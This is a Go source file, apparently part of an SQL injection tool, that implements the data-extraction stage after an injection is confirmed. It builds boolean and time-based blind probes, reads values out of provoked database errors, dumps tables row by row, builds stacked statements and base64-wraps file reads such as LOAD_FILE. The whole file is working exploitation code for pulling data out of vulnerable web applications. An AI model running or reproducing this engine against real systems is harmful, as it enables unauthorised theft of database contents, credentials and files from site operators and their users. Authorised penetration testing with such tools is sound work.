// Package enumeration implements post-detection SQL injection data
// extraction: database enumeration, table/column discovery, and bulk data
// dumping. It builds on the confirmed Detection from the detection engine and
// never re-runs detection.
package enumeration

import (
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/common"
	"github.com/0xseif-code/vexor/internal/sqli/dbms"
	"github.com/0xseif-code/vexor/internal/sqli/injection"
	"github.com/0xseif-code/vexor/internal/sqli/techniques"
)

// Defaults for the blind extraction engine.
const (
	DefaultConcurrency = 20 // parallel character workers
	DefaultTimeDelay   = 5  // seconds for time-based probes
	DefaultRequestGap  = 50 * time.Millisecond
)

// charsetOrder lists byte values ordered by how common they are in dumped
// data, so the blind engine resolves the most likely characters with the
// fewest probes. The common characters come first, followed by the remaining
// printable ASCII to guarantee full coverage. The list is derived once and
// holds no duplicates.
var charsetOrder = func() []byte {
	common := []byte{
		'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
		'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
		'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
		'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
		'_', '.', '-', '@', ' ', '/', '\\', ':', ';', ',', '(', ')', '[', ']',
		'{', '}', '<', '>', '=', '+', '*', '#', '$', '&', '%', '!', '?', '~',
		'`', '^', '|', '"', '\'', '\t', '\n', '\r',
	}
	seen := make(map[byte]bool)
	var out []byte
	for _, c := range common {
		if !seen[c] {
			seen[c] = true
			out = append(out, c)
		}
	}
	// Fill in any remaining printable ASCII so the alphabet is complete.
	for c := byte(0x20); c <= 0x7e; c++ {
		if !seen[c] {
			seen[c] = true
			out = append(out, c)
		}
	}
	return out
}()

// defaultCharset is the printable ASCII set used as the probe alphabet once the
// "common" prefix is exhausted.
func defaultCharset() []byte {
	seen := make(map[byte]bool)
	var out []byte
	for _, c := range charsetOrder {
		if !seen[c] {
			seen[c] = true
			out = append(out, c)
		}
	}
	return out
}

var defaultAlphabet = func() []byte { return defaultCharset() }()

// Options tunes the extraction engine.
type Options struct {
	Concurrency int           // parallel character workers (blind only)
	Delay       time.Duration // inter-request throttle
	Timeout     time.Duration // per-request timeout
	Sleep       int           // seconds for time-based probes
	Progress    io.Writer     // progress stream (defaults to stderr)
	Meter       *common.Meter
	// Crack controls dictionary cracking of recovered password hashes
	// (CrackPrompt asks first, CrackForce runs silently, CrackNever disables).
	Crack CrackPolicy
}

// Extractor turns an arbitrary SQL expression into a value, character by
// character, by probing the point with boolean or time predicates. Enumeration,
// dump and takeover all build on it.
type Extractor struct {
	point   *injection.InjectionPoint
	db      string
	tech    string
	client  *httpclient.Client
	base    *common.Baseline
	queries *dbms.Queries
	extract dbms.Extract

	// error-based leak channel state (MySQL and friends when verbose errors).
	errChans   []dbms.ErrorFn
	detPayload string
	errPrefix  string
	errSuffix  string
	errChan    *dbms.ErrorFn
	errKnown   bool
	errBroken  bool
	errMut     sync.Mutex

	// last DBMS error text observed, for diagnostics.
	errSnippet string
	snippetMut sync.Mutex

	throttle common.Throttle
	timeout  time.Duration
	delay    string
	concur   int
	progress io.Writer
	meter    *common.Meter

	// boolean calibration
	trueSig    *common.Sig
	falseSig   *common.Sig
	calibrated bool
	calibMut   sync.Mutex
}

// NewExtractor builds an extractor from a confirmed detection. It does NOT
// re-run detection and requires a non-nil Point.
func NewExtractor(det sqli.Detection, client *httpclient.Client, opts Options) *Extractor {
	if opts.Concurrency < 1 {
		opts.Concurrency = DefaultConcurrency
	}
	if opts.Timeout <= 0 {
		opts.Timeout = 8 * time.Second
	}
	if opts.Sleep <= 0 {
		opts.Sleep = DefaultTimeDelay
	}
	if opts.Delay <= 0 {
		opts.Delay = optionsGap(opts)
	}
	if opts.Progress == nil {
		opts.Progress = io.Discard
	}
	dbName := dbms.NormalizeName(det.DBMS)
	x := &Extractor{
		point:    &det.Point,
		db:       dbName,
		tech:     det.Technique,
		client:   client,
		queries:  dbms.Post(dbName),
		throttle: common.NewThrottle(opts.Delay),
		timeout:  opts.Timeout,
		delay:    fmt.Sprintf("%d", opts.Sleep),
		concur:   opts.Concurrency,
		progress: opts.Progress,
		meter:    opts.Meter,
	}
	if x.queries != nil {
		x.extract = x.queries.Extract
		x.errChans = append([]dbms.ErrorFn(nil), x.queries.Extract.Errors...)
	}
	x.detPayload = det.Payload
	return x
}

func optionsGap(_ Options) time.Duration {
	return 0
}

// DB returns the normalized backend DBMS name.
func (x *Extractor) DB() string { return x.db }

// Technique returns the detection technique label.
func (x *Extractor) Technique() string { return x.tech }

// IsBlind reports whether extraction must proceed character-by-character.
func (x *Extractor) IsBlind() bool {
	switch x.tech {
	case techniques.TechBoolean, techniques.TechTime:
		return true
	}
	return false
}

// send renders and transmits one payload, returning the response.
func (x *Extractor) send(ctx context.Context, value string) (*httpclient.Response, error) {
	rr := x.point.Render(value)
	if rr == nil {
		return nil, errors.New("injection point cannot render request")
	}
	resp, err := common.Do(ctx, x.client, x.throttle, rr.Method, rr.URL, rr.Body, rr.Headers, x.timeout, x.meter)
	if err == nil && resp != nil {
		x.recordErrorSnippet(resp.Body)
	}
	return resp, err
}

// recordErrorSnippet keeps a bounded window of the most recent verbose DBMS
// error response for diagnostics.
func (x *Extractor) recordErrorSnippet(body []byte) {
	_, ev := dbms.MatchError(body)
	if ev == "" {
		return
	}
	const window = 220
	i := strings.Index(string(body), ev)
	if i < 0 {
		i = 0
	}
	start := i - window/2
	if start < 0 {
		start = 0
	}
	end := start + window
	if end > len(body) {
		end = len(body)
	}
	snippet := string(bytes.TrimSpace(body[start:end]))
	x.snippetMut.Lock()
	x.errSnippet = snippet
	x.snippetMut.Unlock()
}

// LastErrorSnippet returns the most recent verbatim DBMS error text observed,
// or "" when none has been seen yet.
func (x *Extractor) LastErrorSnippet() string {
	x.snippetMut.Lock()
	defer x.snippetMut.Unlock()
	return x.errSnippet
}

// sendRaw transmits an explicit rendered request (used by direct techniques).
func (x *Extractor) sendRaw(ctx context.Context, rr *injection.RenderedRequest) (*httpclient.Response, error) {
	if rr == nil {
		return nil, errors.New("nil rendered request")
	}
	return common.Do(ctx, x.client, x.throttle, rr.Method, rr.URL, rr.Body, rr.Headers, x.timeout, x.meter)
}

// calibrate captures the true / false oracle signatures for the boolean
// technique. It runs once and caches the result.
func (x *Extractor) calibrate(ctx context.Context) error {
	x.calibMut.Lock()
	defer x.calibMut.Unlock()
	if x.calibrated {
		return nil
	}
	orig := x.point.Value
	if x.extract.BoolTrue == nil || x.extract.BoolFalse == nil {
		return errors.New("boolean predicates unsupported for this backend")
	}
	trueResp, err := x.send(ctx, x.extract.BoolTrue(orig))
	if err != nil {
		return fmt.Errorf("boolean true calibration: %w", err)
	}
	falseResp, err := x.send(ctx, x.extract.BoolFalse(orig))
	if err != nil {
		return fmt.Errorf("boolean false calibration: %w", err)
	}
	x.trueSig = common.SigOf(trueResp)
	x.falseSig = common.SigOf(falseResp)
	x.calibrated = true
	// If comparison pointless (identical sigs) fall back to baseline for truth.
	return nil
}

// probe evaluates a boolean condition string and reports whether it resolved
// true. For boolean technique this is a signature comparison; for time it is a
// latency measurement. When the confirmed technique is a direct one (union,
// error, stacked, inline, oob) but boolean/time evaluators are still present —
// which is overwhelmingly the case on real targets — we fall back to the first
// evaluator that produces a decisive result, so extraction is not blocked by
// the detection technique label.
func (x *Extractor) probe(ctx context.Context, cond string) (bool, error) {
	var runFuncs []evalFunc
	switch x.tech {
	case techniques.TechBoolean:
		runFuncs = []evalFunc{x.evalBoolean}
	case techniques.TechTime:
		runFuncs = []evalFunc{x.evalTime}
	case techniques.TechUnion, techniques.TechError, techniques.TechStacked, techniques.TechInline, techniques.TechOOB:
		runFuncs = []evalFunc{x.evalBoolean, x.evalTime}
	default:
		runFuncs = []evalFunc{x.evalBoolean, x.evalTime}
	}
	var lastErr error
	for _, fn := range runFuncs {
		val, decisive, err := fn(ctx, cond)
		if err != nil {
			lastErr = err
			continue
		}
		if decisive {
			return val, nil
		}
	}
	if lastErr != nil {
		return false, lastErr
	}
	return false, errors.New("no working extraction evaluator for backend/technique")
}

type evalFunc func(ctx context.Context, cond string) (bool, bool, error)

func (x *Extractor) evalBoolean(ctx context.Context, cond string) (bool, bool, error) {
	if err := x.calibrate(ctx); err != nil {
		return false, false, err
	}
	orig := x.point.Value
	if x.extract.BoolTest == nil {
		return false, false, errors.New("boolean test predicate unsupported")
	}
	resp, err := x.send(ctx, x.extract.BoolTest(orig, cond))
	if err != nil {
		return false, false, err
	}
	s := common.SigOf(resp)
	simTrue := common.Sim(x.trueSig, s)
	simFalse := common.Sim(x.falseSig, s)
	// decisive only when clearly closer to one oracle.
	if simTrue >= 0.85 && simTrue-simFalse > 0.10 {
		return true, true, nil
	}
	if simFalse >= 0.85 && simFalse-simTrue > 0.10 {
		return false, true, nil
	}
	return false, false, nil
}

func (x *Extractor) evalTime(ctx context.Context, cond string) (bool, bool, error) {
	orig := x.point.Value
	if x.extract.TimeTest == nil {
		return false, false, errors.New("time test predicate unsupported")
	}
	resp, err := x.send(ctx, x.extract.TimeTest(orig, cond, x.delay))
	if err != nil {
		return false, false, err
	}
	threshold := time.Duration(x.mustInt(x.delay)) * (time.Second / 2)
	if threshold < time.Second {
		threshold = time.Second
	}
	base := time.Duration(0)
	if x.base != nil {
		base = x.base.Median
	}
	// The delay fires the sleep in the TRUE branch, so a slow response is
	// decisively TRUE and a fast (baseline-like) response is decisively FALSE.
	if resp.Duration >= base+threshold {
		return true, true, nil
	}
	// Fast response: only decisive FALSE when we have a reliable baseline so
	// that a slow-but-not-sleeping response is not mislabelled.
	if x.base != nil && resp.Duration <= base+(threshold/2) {
		return false, true, nil
	}
	return false, false, nil
}

func (x *Extractor) mustInt(s string) int {
	n := 0
	for _, r := range s {
		if r < '0' || r > '9' {
			break
		}
		n = n*10 + int(r-'0')
	}
	if n == 0 {
		n = 1
	}
	return n
}

// ExtractInt extracts an integer scalar value from an expression. For blind
// techniques this walks the length via character representation; for direct
// techniques it parses the reflected value.
func (x *Extractor) ExtractInt(ctx context.Context, expr string) (int64, error) {
	s, err := x.ExtractString(ctx, expr)
	if err != nil {
		return 0, err
	}
	return parseInt(s)
}

// ExtractString extracts a scalar value from a 1x1 SELECT expression (e.g.
// "SELECT user()"). For error-based techniques it reads the value directly out
// of a provoked DBMS error; for everything else it falls back to the blind
// engine (length detection then per-character probes).
func (x *Extractor) ExtractString(ctx context.Context, expr string) (string, error) {
	if x.tech == techniques.TechError && len(x.errChans) > 0 && !x.errBroken {
		if val, err := x.errorString(ctx, expr); err == nil {
			return val, nil
		}
		// calibration already failed once → avoid hammering; fall back blind.
	}
	return x.blindString(ctx, expr)
}

// blindString extracts the value character by character (boolean or time
// channel). It first detects the length to bound the character scan.
func (x *Extractor) blindString(ctx context.Context, expr string) (string, error) {
	if x.extract.CharAt == nil || x.extract.Length == nil {
		return "", fmt.Errorf("string extraction unsupported for %s", x.db)
	}
	// Length detection first — required to bound the char scan.
	length, err := x.detectLength(ctx, expr)
	if err != nil {
		if errors.Is(err, context.Canceled) {
			return "", err
		}
		// No working oracle (boolean/time channels are undecidable), so we
		// cannot read the value. Surface the failure instead of returning a
		// silent empty result — an empty dump hides real extraction problems.
		return "", fmt.Errorf("cannot determine value length: %w", err)
	}
	if length == 0 {
		return "", nil
	}
	maxLen := x.extract.MaxLen
	if maxLen <= 0 {
		maxLen = 128
	}
	if length > int64(maxLen) {
		return "", fmt.Errorf("value length %d exceeds max %d", length, maxLen)
	}
	out := make([]byte, length)

	jobs := make(chan int64)
	var wg sync.WaitGroup
	workers := x.concur
	if int64(workers) > length {
		workers = int(length)
	}
	if workers < 1 {
		workers = 1
	}
	probeErr := make(chan error, 1)
	var errOnce sync.Once

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pos := range jobs {
				code, err := x.extractCharAt(ctx, expr, pos)
				if err != nil {
					errOnce.Do(func() { probeErr <- err })
					return
				}
				out[pos-1] = byte(code)
				reportProgress(x.progress, "\r[extract] char %d/%d", pos, length)
			}
		}()
	}
	for pos := int64(1); pos <= length; pos++ {
		select {
		case jobs <- pos:
		case <-ctx.Done():
			close(jobs)
			wg.Wait()
			return "", ctx.Err()
		}
	}
	close(jobs)
	wg.Wait()

	select {
	case err := <-probeErr:
		return "", err
	default:
	}
	return string(out), nil
}

// detectLength determines the character length of the expression result via
// binary search over [0, MaxLen]. Returns 0 for an empty/NULL result.
func (x *Extractor) detectLength(ctx context.Context, expr string) (int64, error) {
	maxLen := int64(x.extract.MaxLen)
	if maxLen <= 0 {
		maxLen = 128
	}
	// Exponential then binary search.
	lo, hi := int64(0), int64(1)
	for {
		if ctx.Err() != nil {
			return 0, ctx.Err()
		}
		cond := x.extract.Length(expr) + " >= " + itoa(hi)
		ok, err := x.probe(ctx, cond)
		if err != nil {
			return 0, err
		}
		if !ok {
			break
		}
		lo = hi
		hi *= 2
		if hi > maxLen {
			hi = maxLen
			break
		}
	}
	if hi == 0 {
		return 0, nil
	}
	// Binary search in (lo, hi].
	for lo < hi {
		if ctx.Err() != nil {
			return 0, ctx.Err()
		}
		mid := lo + (hi-lo+1)/2
		cond := x.extract.Length(expr) + " >= " + itoa(mid)
		ok, err := x.probe(ctx, cond)
		if err != nil {
			return 0, err
		}
		if ok {
			lo = mid
		} else {
			hi = mid - 1
		}
	}
	return lo, nil
}

// extractCharAt resolves the ASCII code of the character at 1-based position
// pos. It starts from the common charset (cheap single probes for the most
// likely values) and falls back to a full binary search over 0..255.
func (x *Extractor) extractCharAt(ctx context.Context, expr string, pos int64) (int, error) {
	codeExpr := x.extract.CharAt(expr, int(pos))

	// 1) Fast path: check membership in the common charset and pin exact code
	//    via binary search over that ordered alphabet.
	if m := x.probeInCharset(ctx, codeExpr, charsetOrder); m != -1 {
		return int(charsetOrder[m]), nil
	}

	// 2) Full binary search over 0..255 to capture any remaining byte.
	return x.binarySearchByte(ctx, codeExpr)
}

// probeInCharset binary-searches the code expression against the sorted-chunk
// of the charset. Returns index into alphabet or -1 if no byte matches.
func (x *Extractor) probeInCharset(ctx context.Context, codeExpr string, alphabet []byte) int {
	// Probe chunks with a threshold so a few probes can quickly reject the
	// whole alphabet when the value is outside it.
	sorted := append([]byte(nil), alphabet...)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })

	// Single-value membership check: is the code <= max(alphabet)?
	if len(sorted) == 0 {
		return -1
	}
	// Is code <= largest known password-ish char? If not, fall through to byte
	// search.
	ok, err := x.probe(ctx, codeExpr+" <= "+itoa(int64(sorted[len(sorted)-1])))
	if err != nil {
		return -1
	}
	if !ok {
		return -1
	}
	// Binary search within sorted alphabet for the exact code value.
	lo, hi := 0, len(sorted)-1
	for lo < hi {
		if ctx.Err() != nil {
			return -1
		}
		mid := lo + (hi-lo)/2
		ok, err := x.probe(ctx, codeExpr+" <= "+itoa(int64(sorted[mid])))
		if err != nil {
			return -1
		}
		if ok {
			hi = mid
		} else {
			lo = mid + 1
		}
	}
	// Verify exact equality to avoid false positives on the bound.
	eq, err := x.probe(ctx, codeExpr+" = "+itoa(int64(sorted[lo])))
	if err != nil || !eq {
		return -1
	}
	// Map back to original alphabet index.
	for i, b := range alphabet {
		if b == sorted[lo] {
			return i
		}
	}
	return -1
}

// binarySearchByte finds the exact byte code in [0,255].
func (x *Extractor) binarySearchByte(ctx context.Context, codeExpr string) (int, error) {
	lo, hi := 0, 255
	for lo < hi {
		if ctx.Err() != nil {
			return 0, ctx.Err()
		}
		mid := lo + (hi-lo)/2
		ok, err := x.probe(ctx, codeExpr+" <= "+itoa(int64(mid)))
		if err != nil {
			return 0, err
		}
		if ok {
			hi = mid
		} else {
			lo = mid + 1
		}
	}
	return lo, nil
}

// ExtractRows extracts a multi-row, fixed-width result from a query. cols is
// the number of result columns. Each row is a slice of column strings. This is
// an internal higher-level routine used by enumerators. The query must be a
// simple SELECT (no subqueries in the select list) so its output columns can be
// reliably aliased for offset-based cell access.
func (x *Extractor) ExtractRows(ctx context.Context, query string, cols int) ([][]string, error) {
	// Row count first. The fragment is wrapped as a scalar subquery so it is a
	// valid expression inside blind length probes and error-channel reads.
	countExpr := "(SELECT count(*) FROM (" + query + ") AS x)"
	rowCount, err := x.ExtractInt(ctx, countExpr)
	if err != nil {
		return nil, fmt.Errorf("row count: %w", err)
	}
	if rowCount < 0 {
		rowCount = 0
	}
	// Build an aliased variant so cell expressions can address columns by name.
	aliased := aliasSelectColumns(query, cols)
	rows := make([][]string, 0, rowCount)
	for r := int64(0); r < rowCount; r++ {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}
		row := make([]string, cols)
		for c := 0; c < cols; c++ {
			valExpr := cellExpr(aliased, c, r)
			val, err := x.ExtractString(ctx, valExpr)
			if err != nil {
				return nil, fmt.Errorf("row %d col %d: %w", r, c, err)
			}
			row[c] = val
		}
		rows = append(rows, row)
		reportProgress(x.progress, "\r[extract] row %d/%d", r+1, rowCount)
	}
	return rows, nil
}

// cellExpr produces a scalar expression yielding the cell at (row, col) of an
// aliased derived table using LIMIT/OFFSET (works on MySQL/Postgres/SQLite).
// The LIMIT is placed inside the derived table so the backend applies any
// ORDER BY before the offset is taken, keeping row order deterministic even on
// MySQL where a bare derived-table ORDER BY can be optimised away.
func cellExpr(aliasedQuery string, col int, row int64) string {
	return "SELECT " + colName(col) + " FROM (" + appendLimitOffset(aliasedQuery, row) + ") AS x"
}

// trailingLimit matches a LIMIT ... / LIMIT ... OFFSET ... clause at the very
// end of a query so appendLimitOffset does not produce two LIMIT clauses.
var trailingLimit = regexp.MustCompile(`(?is)\s+LIMIT\s+\d+\s*(OFFSET\s+\d+)?\s*$`)

// appendLimitOffset appends " LIMIT 1 OFFSET row", dropping any existing
// trailing LIMIT clause first.
func appendLimitOffset(query string, row int64) string {
	if row < 0 {
		row = 0
	}
	q := trailingLimit.ReplaceAllString(query, "")
	return q + " LIMIT 1 OFFSET " + itoa(row)
}

func colName(c int) string {
	return fmt.Sprintf("c%d", c+1)
}

// aliasSelectColumns rewrites the select list of a simple query so each output
// column gets a predictable alias (c1, c2, ...). The query's select list is
// split at the first top-level FROM; each entry is appended with its alias.
// Expressions that already carry an alias are left untouched. If the select
// list cannot be parsed safely the original query is returned.
func aliasSelectColumns(query string, cols int) string {
	up := strings.ToUpper(query)
	// Find the first FROM keyword that is not inside parentheses.
	depth := 0
	fromIdx := -1
	for i := 0; i < len(up); i++ {
		switch up[i] {
		case '(':
			depth++
		case ')':
			if depth > 0 {
				depth--
			}
		default:
			if depth == 0 && strings.HasPrefix(up[i:], "FROM") {
				// must be boundary
				hasSpaceBefore := i == 0 || up[i-1] == ' ' || up[i-1] == '\t' || up[i-1] == '\n'
				if hasSpaceBefore {
					after := i + 4
					okAfter := after >= len(up) || up[after] == ' ' || up[after] == '\t' || up[after] == '\n' ||
						up[after] == '(' || up[after] == ')' || up[after] == ','
					if okAfter {
						fromIdx = i
						break
					}
				}
			}
		}
	}
	if fromIdx < 0 {
		return query
	}
	sel := strings.TrimSpace(query[6:fromIdx]) // after "SELECT "
	rest := query[fromIdx:]
	if sel == "" {
		return query
	}
	// Split select entries on top-level commas.
	entries := splitTopLevel(sel, ',')
	aliased := make([]string, 0, len(entries))
	for i, e := range entries {
		e = strings.TrimSpace(e)
		if e == "" {
			continue
		}
		asName := fmt.Sprintf("c%d", i+1)
		if hasAlias(e) {
			// keep existing alias
			aliased = append(aliased, e)
		} else {
			aliased = append(aliased, e+" AS "+asName)
		}
	}
	return "SELECT " + strings.Join(aliased, ", ") + " " + rest
}

// hasAlias reports whether a select expression already defines its own alias
// (contains a top-level AS or a trailing bare identifier).
func hasAlias(expr string) bool {
	up := strings.ToUpper(expr)
	if idx := findTopLevelKeyword(up, "AS"); idx >= 0 {
		return true
	}
	// bare alias: two space-separated non-quoted identifiers, e.g. "u.name user"
	fields := strings.Fields(expr)
	return len(fields) >= 2 && !strings.ContainsAny(fields[len(fields)-1], "()+-*/='\"")
}

// findTopLevelKeyword locates a keyword outside of parentheses and quotes.
func findTopLevelKeyword(s, kw string) int {
	depth := 0
	inStr := byte(0)
	for i := 0; i < len(s); i++ {
		ch := s[i]
		if inStr != 0 {
			if ch == inStr {
				inStr = 0
			}
			continue
		}
		switch ch {
		case '\'', '"', '`':
			inStr = ch
		case '(':
			depth++
		case ')':
			if depth > 0 {
				depth--
			}
		default:
			if depth == 0 && strings.HasPrefix(s[i:], kw) {
				before := i == 0 || s[i-1] == ' ' || s[i-1] == '\t'
				after := i + len(kw)
				okAfter := after >= len(s) || s[after] == ' ' || s[after] == '\t' || s[after] == '\n'
				if before && okAfter {
					return i
				}
			}
		}
	}
	return -1
}

// splitTopLevel splits s on sep at nesting depth 0, honouring string quotes.
func splitTopLevel(s string, sep byte) []string {
	depth := 0
	inStr := byte(0)
	start := 0
	var out []string
	for i := 0; i < len(s); i++ {
		ch := s[i]
		if inStr != 0 {
			if ch == inStr {
				inStr = 0
			}
			continue
		}
		switch ch {
		case '\'', '"', '`':
			inStr = ch
		case '(':
			depth++
		case ')':
			if depth > 0 {
				depth--
			}
		default:
			if ch == sep && depth == 0 {
				out = append(out, s[start:i])
				start = i + 1
			}
		}
	}
	out = append(out, s[start:])
	return out
}

// SetBase associates a captured baseline with the extractor for time-based
// latency calibration. Optional.
func (x *Extractor) SetBase(b *common.Baseline) {
	x.base = b
}

// Original returns the raw pre-injection value of the point.
func (x *Extractor) Original() string {
	if x.point == nil {
		return ""
	}
	return x.point.Value
}

// Render produces a rendered request with the given value injected.
func (x *Extractor) Render(value string) *injection.RenderedRequest {
	if x.point == nil {
		return nil
	}
	return x.point.Render(value)
}

// Send injects value at the point, transmits it and returns the response.
func (x *Extractor) Send(ctx context.Context, value string) (*httpclient.Response, error) {
	rr := x.Render(value)
	if rr == nil {
		return nil, errors.New("cannot render request")
	}
	return x.sendRaw(ctx, rr)
}

// StackIf builds a stacked-statement injection: "orig ; statement --". When the
// backend does not support stacking it returns the original which the caller
// should treat as unusable.
func (x *Extractor) StackIf(statement string) string {
	if x.queries == nil || !x.queries.StackedOK {
		return ""
	}
	orig := x.Original()
	return orig + ";" + statement + "-- -"
}

// ExtractBase64String reads a value that was base64-encoded by the query,
// e.g. TO_BASE64(LOAD_FILE(...)), and returns the decoded bytes.
func (x *Extractor) ExtractBase64String(ctx context.Context, expr string) ([]byte, error) {
	return x.readEncoded(ctx, expr, true)
}

// ExtractBinaryString reads a value that may contain arbitrary bytes by
// extracting its base64 representation (when binary is expected) or raw.
func (x *Extractor) readEncoded(ctx context.Context, expr string, forceBase64 bool) ([]byte, error) {
	if !x.IsBlind() {
		s, err := x.ExtractString(ctx, expr)
		return []byte(s), err
	}
	s, err := x.ExtractString(ctx, expr)
	if err != nil {
		return nil, err
	}
	if forceBase64 {
		dec, derr := base64.StdEncoding.DecodeString(s)
		if derr == nil {
			return dec, nil
		}
	}
	return []byte(s), nil
}

// B64Expr wraps an expression so the backend returns a base64 string, letting
// us carry arbitrary/binary bytes through the blind channel.
func (x *Extractor) B64Expr(expr string) string {
	switch x.db {
	case "mysql":
		return "to_base64((" + expr + "))"
	case "postgres":
		return "encode(convert_to((" + expr + ")::text,'UTF8'),'base64')"
	case "mssql":
		return expr
	case "oracle":
		return expr
	case "sqlite":
		return expr
	default:
		return expr
	}
}

func parseInt(s string) (int64, error) {
	s = trimSpace(s)
	if s == "" {
		return 0, nil
	}
	n := int64(0)
	neg := false
	i := 0
	if s[0] == '-' {
		neg = true
		i++
	}
	for ; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			break
		}
		n = n*10 + int64(s[i]-'0')
	}
	if neg {
		n = -n
	}
	return n, nil
}

func trimSpace(s string) string {
	start, end := 0, len(s)
	for start < end && (s[start] == ' ' || s[start] == '\t' || s[start] == '\n' || s[start] == '\r') {
		start++
	}
	for end > start && (s[end-1] == ' ' || s[end-1] == '\t' || s[end-1] == '\n' || s[end-1] == '\r') {
		end--
	}
	return s[start:end]
}

func itoa(n int64) string {
	if n < 0 {
		return "-" + itoa(-n)
	}
	if n == 0 {
		return "0"
	}
	var buf [20]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}

func reportProgress(w io.Writer, format string, args ...any) {
	if w == nil {
		return
	}
	fmt.Fprintf(w, format+"\n", args...)
}
